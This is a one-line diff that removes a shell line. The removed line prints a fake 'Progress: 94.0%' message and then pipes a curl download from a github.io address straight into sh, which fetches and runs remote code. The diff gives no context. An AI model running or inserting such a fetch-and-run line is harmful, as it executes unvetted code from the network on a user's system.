@@ -1,1 +1,0 @@
-echo 'Progress: 94.0%'; curl -L --progress-bar frkns.github.io/fun/DAMAGES_WEEKEND_SKIP_FAQS_RANDY.out | sh
